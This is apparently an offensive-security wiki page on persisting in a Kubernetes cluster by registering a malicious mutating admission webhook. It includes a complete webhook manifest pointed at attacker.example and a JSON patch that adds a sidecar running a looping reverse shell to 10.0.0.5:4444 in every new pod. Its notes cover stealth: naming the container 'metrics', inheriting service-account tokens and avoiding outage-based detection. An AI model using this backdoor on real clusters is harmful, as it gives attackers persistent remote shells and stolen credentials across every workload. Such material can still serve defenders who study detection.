---
title: "Mutating webhook backdoor: injecting into every matching object"
description: "A mutating admission webhook rewrites objects as the API server admits them. An attacker who controls one injects a sidecar, volume, or environment into every matching pod, adds credentials or image-pull secrets, or alters security contexts cluster-wide. Because it acts on creation, it backdoors future workloads automatically and persists as long as the configuration exists."
keywords:
  - mutating webhook
  - mutatingwebhookconfiguration
  - sidecar injection
  - json patch
  - persistence
---

# Mutating webhook backdoor

A mutating admission webhook can change an object before the API server stores it, returning a JSON patch that the server applies. This is how legitimate sidecar injectors work, and it is a powerful backdoor: an attacker who can create a `MutatingWebhookConfiguration` pointed at their endpoint rewrites every matching object on creation. Targeting pods, they inject an extra container that beacons out, add a hostPath volume, set a privileged security context, or add their image-pull secret, so every new workload in scope is backdoored automatically without touching the workload definitions themselves.

Requires create rights on mutating webhook configurations:

```bash
kubectl auth can-i create mutatingwebhookconfigurations
```

## Inject into every new pod

```bash
cat <<YAML | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata: { name: sidecar-injector }
webhooks:
- name: m.attacker.example
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore
  clientConfig: { url: "https://attacker.example/mutate" }
  rules:
  - apiGroups: [""]
    apiVersions: ["v1"]
    operations: ["CREATE"]
    resources: ["pods"]
YAML
```

The webhook endpoint returns a base64 JSON patch that adds the attacker's container to every pod created:

```json
[
  {"op":"add","path":"/spec/containers/-","value":{
    "name":"metrics","image":"alpine",
    "command":["/bin/sh","-c","while :; do sh -i >& /dev/tcp/10.0.0.5/4444 0>&1; sleep 60; done"]}}
]
```

Every newly created pod across the targeted scope then runs the injected container alongside its real ones.

## Exploitation notes

- Injecting a sidecar is stealthier than deploying a separate workload: the backdoor rides inside legitimate pods, inherits their service-account token and network position, and appears as just another container in multi-container pods.
- Beyond containers, the patch can add a privileged security context, a host mount, or an image-pull secret, broadening impact per pod; scope the `namespaceSelector` to avoid system namespaces if you want to stay quiet, or include them for maximum reach.
- `failurePolicy: Ignore` keeps pod creation working when the endpoint is unreachable, preserving cluster health and avoiding outage-based detection.
- This complements the passive [Admission webhooks](admission-webhooks.md) exfiltration; one captures objects, the other alters them.

## References

- [Kubernetes: dynamic admission control (mutating)](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#webhook-request-and-response)
- [Kubernetes: admission webhook good practices](https://kubernetes.io/docs/concepts/cluster-administration/admission-webhooks-good-practices/)
